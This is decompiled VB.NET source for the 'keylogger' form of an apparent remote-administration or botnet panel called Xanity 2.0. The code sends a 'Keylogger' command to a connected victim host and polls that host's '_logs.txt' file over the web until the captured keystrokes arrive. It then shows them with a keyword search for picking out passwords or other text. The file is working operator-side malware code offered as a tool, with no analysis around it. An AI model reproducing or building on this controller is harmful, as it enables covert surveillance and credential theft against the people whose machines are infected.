Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class keylogger
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.keylogger_Load)
            keylogger.__ENCAddToList(Me)
            Me.server = New API
            Me.start = 0
            Me.indexOfSearchText = 0
            Me.startindex = 0
            Me.txt = String.Empty
            Me.url = ""
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = keylogger.__ENCList
            SyncLock list
                If (keylogger.__ENCList.Count = keylogger.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (keylogger.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = keylogger.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                keylogger.__ENCList.Item(index) = keylogger.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    keylogger.__ENCList.RemoveRange(index, (keylogger.__ENCList.Count - index))
                    keylogger.__ENCList.Capacity = keylogger.__ENCList.Count
                End If
                keylogger.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.FlatStatusBar1.Text = "Command sent!"
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.url = (host & "/" & file & "_logs.txt")
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Keylogger", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.x = New Thread(New ThreadStart(AddressOf Me.check))
                Me.x.Start
                Me.rtblogs.ScrollToCaret
                Me.FlatStatusBar1.Text = "Keyloggs received!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub check()
            Do While True
                Dim lErl As Integer = 1
                Try 
                    Dim client As New WebClient
                    Me.Invoke(New DelegateWrite(AddressOf Me.Write), New Object() { Me.rtblogs, client.DownloadString(Me.url) })
                    Return
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1, lErl)
                    ProjectData.ClearProjectError
                End Try
            Loop
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Public Function FindMyText(ByVal txtToSearch As String, ByVal searchStart As Integer, ByVal searchEnd As Integer) As Integer
            If (If((((searchStart <= 0) OrElse (searchEnd <= 0)) OrElse (Me.indexOfSearchText < 0)), 0, 1) <> 0) Then
                Me.rtblogs.Undo
            End If
            Dim indexOfSearchText As Integer = -1
            If ((If(((searchStart < 0) OrElse (Me.indexOfSearchText < 0)), 0, 1) <> 0) AndAlso ((searchEnd > searchStart) OrElse (searchEnd = -1))) Then
                Me.indexOfSearchText = Me.rtblogs.Find(txtToSearch, searchStart, searchEnd, RichTextBoxFinds.None)
                If (Me.indexOfSearchText <> -1) Then
                    indexOfSearchText = Me.indexOfSearchText
                End If
            End If
            Return indexOfSearchText
        End Function

        Private Sub FlatButton1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.rtblogs.ForeColor = Color.White
            Me.txt = Interaction.InputBox("Please enter a Keyword you want to search for!", "Search", "", -1, -1)
            If (Me.txt <> "") Then
                Me.startindex = 0
                Me.start = 0
                Me.indexOfSearchText = 0
                If (Me.txt.Length > 0) Then
                    Me.startindex = Me.FindMyText(Me.txt.Trim, Me.start, Me.rtblogs.Text.Length)
                End If
                If (Me.startindex >= 0) Then
                    Me.rtblogs.SelectionColor = Color.Red
                    Dim length As Integer = Me.txt.Length
                    Me.rtblogs.Select(Me.startindex, length)
                    Me.rtblogs.ScrollToCaret
                    Me.start = (Me.startindex + length)
                End If
            End If
        End Sub

        Private Sub FlatButton2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.txt.Length > 0) Then
                    Me.startindex = Me.FindMyText(Me.txt.Trim, Me.start, Me.rtblogs.Text.Length)
                End If
                If (Me.startindex >= 0) Then
                    Me.rtblogs.SelectionColor = Color.Red
                    Dim length As Integer = Me.txt.Length
                    Me.rtblogs.Select(Me.startindex, length)
                    Me.rtblogs.ScrollToCaret
                    Me.start = (Me.startindex + length)
                End If
                If (Me.rtblogs.TextLength = Me.start) Then
                    Me.startindex = 0
                    Me.start = 0
                    Me.indexOfSearchText = 0
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(keylogger))
            Me.FormSkin1 = New FormSkin
            Me.FlatMini1 = New FlatMini
            Me.FlatMax1 = New FlatMax
            Me.FlatCloseKE1 = New FlatCloseKE
            Me.NumericUpDown1 = New NumericUpDown
            Me.FlatButton2 = New FlatButton
            Me.FlatButton1 = New FlatButton
            Me.rtblogs = New RichTextBox
            Me.btnrefresh = New FlatButton
            Me.FlatLabel1 = New FlatLabel
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.FormSkin1.SuspendLayout
            Me.NumericUpDown1.BeginInit
            Me.SuspendLayout
            Me.FormSkin1.BackColor = Color.White
            Me.FormSkin1.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.FormSkin1.BorderColor = Color.FromArgb(&H35, &H3A, 60)
            Me.FormSkin1.Controls.Add(Me.FlatMini1)
            Me.FormSkin1.Controls.Add(Me.FlatMax1)
            Me.FormSkin1.Controls.Add(Me.FlatCloseKE1)
            Me.FormSkin1.Controls.Add(Me.NumericUpDown1)
            Me.FormSkin1.Controls.Add(Me.FlatButton2)
            Me.FormSkin1.Controls.Add(Me.FlatButton1)
            Me.FormSkin1.Controls.Add(Me.rtblogs)
            Me.FormSkin1.Controls.Add(Me.btnrefresh)
            Me.FormSkin1.Controls.Add(Me.FlatLabel1)
            Me.FormSkin1.Controls.Add(Me.FlatStatusBar1)
            Me.FormSkin1.Dock = DockStyle.Fill
            Me.FormSkin1.FlatColor = Color.DeepPink
            Me.FormSkin1.Font = New Font("Segoe UI", 12!)
            Me.FormSkin1.HeaderColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FormSkin1.HeaderMaximize = False
            Dim point2 As New Point(0, 0)
            Me.FormSkin1.Location = point2
            Me.FormSkin1.Name = "FormSkin1"
            Dim size2 As New Size(&H292, &H157)
            Me.FormSkin1.Size = size2
            Me.FormSkin1.TabIndex = 0
            Me.FormSkin1.Text = "Keylogger"
            Me.FlatMini1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMini1.BackColor = Color.White
            Me.FlatMini1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMini1.Font = New Font("Marlett", 12!)
            point2 = New Point(580, 13)
            Me.FlatMini1.Location = point2
            Me.FlatMini1.Name = "FlatMini1"
            size2 = New Size(&H12, &H12)
            Me.FlatMini1.Size = size2
            Me.FlatMini1.TabIndex = 10
            Me.FlatMini1.Text = "FlatMini1"
            Me.FlatMini1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatMax1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatMax1.BackColor = Color.White
            Me.FlatMax1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatMax1.Enabled = False
            Me.FlatMax1.Font = New Font("Marlett", 12!)
            point2 = New Point(&H25C, 12)
            Me.FlatMax1.Location = point2
            Me.FlatMax1.Name = "FlatMax1"
            size2 = New Size(&H12, &H12)
            Me.FlatMax1.Size = size2
            Me.FlatMax1.TabIndex = 9
            Me.FlatMax1.Text = "FlatMax1"
            Me.FlatMax1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatCloseKE1.Anchor = (AnchorStyles.Right Or AnchorStyles.Top)
            Me.FlatCloseKE1.BackColor = Color.White
            Me.FlatCloseKE1.BaseColor = Color.FromArgb(&HA8, &H23, &H23)
            Me.FlatCloseKE1.Font = New Font("Marlett", 10!)
            point2 = New Point(&H274, 12)
            Me.FlatCloseKE1.Location = point2
            Me.FlatCloseKE1.Name = "FlatCloseKE1"
            size2 = New Size(&H12, &H12)
            Me.FlatCloseKE1.Size = size2
            Me.FlatCloseKE1.TabIndex = 8
            Me.FlatCloseKE1.Text = "FlatCloseKE1"
            Me.FlatCloseKE1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.NumericUpDown1.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or AnchorStyles.Bottom))
            Me.NumericUpDown1.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.NumericUpDown1.ForeColor = Color.White
            point2 = New Point(&H1D2, &H120)
            Me.NumericUpDown1.Location = point2
            Dim num As New Decimal(New Integer() { 1, 0, 0, 0 })
            Me.NumericUpDown1.Minimum = num
            Me.NumericUpDown1.Name = "NumericUpDown1"
            size2 = New Size(&H4B, &H1D)
            Me.NumericUpDown1.Size = size2
            Me.NumericUpDown1.TabIndex = 7
            num = New Decimal(New Integer() { 10, 0, 0, 0 })
            Me.NumericUpDown1.Value = num
            Me.FlatButton2.BackColor = Color.Transparent
            Me.FlatButton2.BaseColor = Color.White
            Me.FlatButton2.Cursor = Cursors.Hand
            Me.FlatButton2.Font = New Font("Segoe UI", 12!)
            point2 = New Point(100, &H11D)
            Me.FlatButton2.Location = point2
            Me.FlatButton2.Name = "FlatButton2"
            Me.FlatButton2.Rounded = False
            size2 = New Size(&H52, &H20)
            Me.FlatButton2.Size = size2
            Me.FlatButton2.TabIndex = 6
            Me.FlatButton2.Text = "Find Next"
            Me.FlatButton2.TextColor = Color.Black
            Me.FlatButton1.BackColor = Color.Transparent
            Me.FlatButton1.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatButton1.Cursor = Cursors.Hand
            Me.FlatButton1.Font = New Font("Segoe UI", 12!)
            point2 = New Point(12, &H11D)
            Me.FlatButton1.Location = point2
            Me.FlatButton1.Name = "FlatButton1"
            Me.FlatButton1.Rounded = False
            size2 = New Size(&H52, &H20)
            Me.FlatButton1.Size = size2
            Me.FlatButton1.TabIndex = 5
            Me.FlatButton1.Text = "Search"
            Me.FlatButton1.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.rtblogs.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.rtblogs.ForeColor = Color.White
            point2 = New Point(3, &H35)
            Me.rtblogs.Location = point2
            Me.rtblogs.Name = "rtblogs"
            size2 = New Size(650, &HE2)
            Me.rtblogs.Size = size2
            Me.rtblogs.TabIndex = 4
            Me.rtblogs.Text = ""
            Me.btnrefresh.BackColor = Color.Transparent
            Me.btnrefresh.BaseColor = Color.DeepPink
            Me.btnrefresh.Cursor = Cursors.Hand
            Me.btnrefresh.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H223, &H11D)
            Me.btnrefresh.Location = point2
            Me.btnrefresh.Name = "btnrefresh"
            Me.btnrefresh.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btnrefresh.Size = size2
            Me.btnrefresh.TabIndex = 3
            Me.btnrefresh.Text = "Refresh"
            Me.btnrefresh.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.FlatLabel1.AutoSize = True
            Me.FlatLabel1.BackColor = Color.Transparent
            Me.FlatLabel1.Font = New Font("Segoe UI", 12!)
            Me.FlatLabel1.ForeColor = Color.White
            point2 = New Point(&H143, 290)
            Me.FlatLabel1.Location = point2
            Me.FlatLabel1.Name = "FlatLabel1"
            size2 = New Size(&H89, &H15)
            Me.FlatLabel1.Size = size2
            Me.FlatLabel1.TabIndex = 1
            Me.FlatLabel1.Text = "Change Font Size: "
            Me.FlatStatusBar1.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.FlatStatusBar1.Font = New Font("Segoe UI", 8!)
            Me.FlatStatusBar1.ForeColor = Color.White
            point2 = New Point(0, &H143)
            Me.FlatStatusBar1.Location = point2
            Me.FlatStatusBar1.Name = "FlatStatusBar1"
            Me.FlatStatusBar1.RectColor = Color.DeepPink
            Me.FlatStatusBar1.ShowTimeDate = False
            size2 = New Size(&H292, 20)
            Me.FlatStatusBar1.Size = size2
            Me.FlatStatusBar1.TabIndex = 0
            Me.FlatStatusBar1.Text = "Idle"
            Me.FlatStatusBar1.TextColor = Color.White
            Dim ef2 As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef2
            Me.AutoScaleMode = AutoScaleMode.Font
            size2 = New Size(&H292, &H157)
            Me.ClientSize = size2
            Me.Controls.Add(Me.FormSkin1)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "keylogger"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.TransparencyKey = Color.Fuchsia
            Me.FormSkin1.ResumeLayout(False)
            Me.FormSkin1.PerformLayout
            Me.NumericUpDown1.EndInit
            Me.ResumeLayout(False)
        End Sub

        Private Sub keylogger_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.NumericUpDown1.Value = New Decimal(Me.rtblogs.Font.Size)
        End Sub

        Private Sub NumericUpDown1_ValueChanged(ByVal sender As Object, ByVal e As EventArgs)
            Dim font As New Font("Arial", Convert.ToSingle(Me.NumericUpDown1.Value))
            Me.rtblogs.Font = font
        End Sub

        Public Sub Write(ByVal rtb As RichTextBox, ByVal [text] As String)
            rtb.Text = [text]
        End Sub


        ' Properties
        Friend Overridable Property btnrefresh As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btnrefresh
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._btnrefresh Is Nothing) Then
                    RemoveHandler Me._btnrefresh.Click, handler
                End If
                Me._btnrefresh = value
                If (Not Me._btnrefresh Is Nothing) Then
                    AddHandler Me._btnrefresh.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatButton1 As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatButton1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FlatButton1_Click)
                If (Not Me._FlatButton1 Is Nothing) Then
                    RemoveHandler Me._FlatButton1.Click, handler
                End If
                Me._FlatButton1 = value
                If (Not Me._FlatButton1 Is Nothing) Then
                    AddHandler Me._FlatButton1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatButton2 As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatButton2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FlatButton2_Click)
                If (Not Me._FlatButton2 Is Nothing) Then
                    RemoveHandler Me._FlatButton2.Click, handler
                End If
                Me._FlatButton2 = value
                If (Not Me._FlatButton2 Is Nothing) Then
                    AddHandler Me._FlatButton2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatCloseKE1 As FlatCloseKE
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatCloseKE1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCloseKE)
                Me._FlatCloseKE1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatMax1 As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMax1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._FlatMax1 = value
            End Set
        End Property

        Friend Overridable Property FlatMini1 As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatMini1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._FlatMini1 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property NumericUpDown1 As NumericUpDown
            <DebuggerNonUserCode> _
            Get
                Return Me._NumericUpDown1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As NumericUpDown)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.NumericUpDown1_ValueChanged)
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    RemoveHandler Me._NumericUpDown1.ValueChanged, handler
                End If
                Me._NumericUpDown1 = value
                If (Not Me._NumericUpDown1 Is Nothing) Then
                    AddHandler Me._NumericUpDown1.ValueChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property rtblogs As RichTextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._rtblogs
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As RichTextBox)
                Me._rtblogs = value
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("btnrefresh")> _
        Private _btnrefresh As FlatButton
        <AccessedThroughProperty("FlatButton1")> _
        Private _FlatButton1 As FlatButton
        <AccessedThroughProperty("FlatButton2")> _
        Private _FlatButton2 As FlatButton
        <AccessedThroughProperty("FlatCloseKE1")> _
        Private _FlatCloseKE1 As FlatCloseKE
        <AccessedThroughProperty("FlatLabel1")> _
        Private _FlatLabel1 As FlatLabel
        <AccessedThroughProperty("FlatMax1")> _
        Private _FlatMax1 As FlatMax
        <AccessedThroughProperty("FlatMini1")> _
        Private _FlatMini1 As FlatMini
        <AccessedThroughProperty("FlatStatusBar1")> _
        Private _FlatStatusBar1 As FlatStatusBar
        <AccessedThroughProperty("FormSkin1")> _
        Private _FormSkin1 As FormSkin
        <AccessedThroughProperty("NumericUpDown1")> _
        Private _NumericUpDown1 As NumericUpDown
        <AccessedThroughProperty("rtblogs")> _
        Private _rtblogs As RichTextBox
        Private components As IContainer
        Public connected As String
        Private indexOfSearchText As Integer
        Private server As API
        Private start As Integer
        Private startindex As Integer
        Private txt As String
        Private url As String
        Private x As Thread

        ' Nested Types
        Public Delegate Sub DelegateWrite(ByVal rtb As RichTextBox, ByVal [text] As String)
    End Class
End Namespace

